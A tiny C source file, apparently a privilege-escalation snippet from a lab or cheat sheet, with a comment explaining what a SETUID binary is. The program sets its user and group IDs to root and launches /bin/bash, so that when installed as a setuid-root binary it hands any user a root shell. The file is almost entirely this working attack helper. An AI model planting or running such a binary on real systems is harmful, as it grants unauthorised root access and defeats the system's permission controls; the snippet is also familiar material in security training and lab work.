/*
 A SETUID binary is a binary that allows users to execute the binary with the permissions of the executables owner.
*/

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}

